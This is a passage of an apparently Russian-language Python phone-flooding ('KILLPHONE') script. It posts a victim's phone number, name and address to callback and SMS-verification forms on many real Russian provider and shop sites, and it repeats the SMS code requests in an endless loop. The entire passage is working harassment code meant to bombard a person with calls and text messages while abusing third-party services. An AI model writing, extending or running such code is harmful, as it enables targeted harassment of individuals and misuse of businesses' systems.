                    r = requests.post('https://kursk.tvoi-provider.ru/actions/formResponse.php', data={'f50name': nf,
                                                                                                       'f50phone': phn6,
                                                                                                       'formCode': 'callConnect',
                                                                                                       'formName': 'Подключиться к оператору'},
                                      headers={})
                    print(Fore.CYAN + """https://kursk.tvoi-provider.ru:
                    Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                            """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                             """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                        """)
                try:
                    r = requests.post('https://internet.gde-luchshe.ru/api/v1/calls/new/', data={'call[phone]': phn4,
                                                                                                 'provider_alias': 'ertelecom'},
                                      headers={})
                    print(Fore.CYAN + """https://internet.gde-luchshe.ru:
                    Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                            """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                        """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                         """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                    """)
                try:
                    r = requests.post('https://kursk.internetv-dom.ru/connect', data={'submitted': '16792',
                                                                                      'isPopup16792': '0',
                                                                                      'fields[16794]': '0',
                                                                                      'fields[16795]': phn1,
                                                                                      'fields[16796]': nff,
                                                                                      'fields[16797]': city,
                                                                                      'fields[16798]': st,
                                                                                      'fields[16799]': d,
                                                                                      'fields[16800]': kv,
                                                                                      'fields[16802]': '1',
                                                                                      'fields[16804]': None,
                                                                                      'fields[0]': '833f7326312f8e31d13de9b8905a7b283',
                                                                                      'fields[1': None}, headers={})
                    print(Fore.CYAN + """https://kursk.internetv-dom.ru
                    Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                            """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                             """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                        """)
                try:
                    r = requests.post('https://ks.wifire.ru/form/mail-sender',
                                      data={'form_name': 'express_form_ccmp_short',
                                            'city': f'Wifire {city}',
                                            'clientName': n,
                                            'clientPhone': phn6,
                                            'clientAddress': None,
                                            'house_guid': None,
                                            'clientSite': ' ks.wifire.ru/nadolgo',
                                            'calltracking_params': None,
                                            'tariffId': '4276',
                                            'tariffName': '#ДляДома Турбо',
                                            'comment': '#ДляДома Турбо'}, headers={})

                    print(Fore.CYAN + """https://ks.wifire.ru
                    Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                            """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                             """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                        """)
                try:
                    r = requests.post('https://kursk-wifire.ru/ajax/saveorder.php', data={'fio': nff,
                                                                                          'phone': phn,
                                                                                          'address': f'г.{city}, ул.{st}, д.{d}',
                                                                                          'tarif_id': '0',
                                                                                          'refmodal': 'returncall-banner',
                                                                                          'connect_type': '1',
                                                                                          'wifi': '0',
                                                                                          'buy_router': '0',
                                                                                          'tvmodul': '0',
                                                                                          'buy_tvmodul': '0'},
                                      headers={})
                    print(Fore.CYAN + """https://kursk-wifire.ru
                    Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                        """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                                        """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                        """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                                    """)
                try:
                    r = requests.post('https://moscow.home.megafon.ru/form/mail-sender',
                                      data={'clientSite': 'moscow.home.megafon.ru/',
                                            'form_name': 'express_form_ccmp_short',
                                            'clientName': n,
                                            'clientPhone': phn6,
                                            'city': 'Москва и область',
                                            'clientAddress': None,
                                            'house_guid': None,
                                            'tariffId': '5989',
                                            'tariffName': 'Объединяй! Максимум',
                                            'comment': 'Объединяй! Максимум 650₽',
                                            'calltracking_params': None}, headers={})

                    print(Fore.CYAN + """https://moscow.home.megafon.ru
                    Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                        """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                                        """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                        """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                                    """)
                print(Fore.LIGHTYELLOW_EX + 'Цикл KILLPHONE завершен')
                try:
                    while True:
                        try:
                            r = requests.post('https://bvbinfo.ru/api/v1/accounts/express_registration/',
                                              data={'phone': f'{p0}{p1}{p2}{p3}{p4}{p5}{p6}{p7}{p8}{p9}{p10}',
                                                   'role': '3'},
                                              headers={})
                            print(Fore.CYAN + """https://bvbinfo.ru
                                                Заявка отправлена...""")
                            if r.status_code == 201:
                                print(Fore.GREEN + """Успешно
                                                                                                """)
                            elif r.status_code == 400:
                                print(Fore.RED + """Безуспешно
                                                                                            """)
                            else:
                                print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                                                             """)
                                try:
                                    print(Fore.BLUE + f'Жду {dly}')
                                    time.sleep(float(dly))
                                except:
                                    print('Не жду')
                        except:
                                print(Fore.RED + """Сервис не отвечает
                                                                               """)

                        try:
                            r = requests.post('https://ohotaktiv.ru/12dev/auth/auth.php?phone=9192796895',
                                              data={'phone': f'{p1}{p2}{p3}{p4}{p5}{p6}{p7}{p8}{p9}{p10}',},
                                              headers={})
                            print(Fore.CYAN + """https://ohotactiv.ru
                                                Заявка отправлена...""")
                            if r.status_code == 201:
                                print(Fore.GREEN + """Успешно
                                                                                                """)
                            elif r.status_code == 400:
                                print(Fore.RED + """Безуспешно
                                                                                            """)
                            else:
                                print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                                                             """)
                                try:
                                    print(Fore.BLUE + f'Жду {dly}')
                                    time.sleep(float(dly))
                                except:
                                    print('Не жду')
                        except:
                            print(Fore.RED + """Сервис не отвечает
                                                                               """)

                        try:
                            r = requests.post('https://api.dodomino.ru/api/app/auth/code-request',
                                              data={'phone': f'{p0}({p1}{p2}{p3}) {p4}{p5}{p6}-{p7}{p8}-{p9}{p10}',},
                                              headers={})
                            print(Fore.CYAN + """https://domino.ru
                                                Заявка отправлена...""")
                            if r.status_code == 201:
                                print(Fore.GREEN + """Успешно
                                                                                                """)
                            elif r.status_code == 400:
                                print(Fore.RED + """Безуспешно
                                                                                            """)
                            else:
                                print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                                                             """)
                                try:
                                    print(Fore.BLUE + f'Жду {dly}')
                                    time.sleep(float(dly))
                                except:
                                    print('Не жду')
                        except:
                            print(Fore.RED + """Сервис не отвечает
                                                                               """)

                except:
                    print(Fore.RED + """idk_lol""")
        except:
                    print(Fore.RED + 'Неправильно набран номер или установлена задержка')

except:
    print('Противодействие')

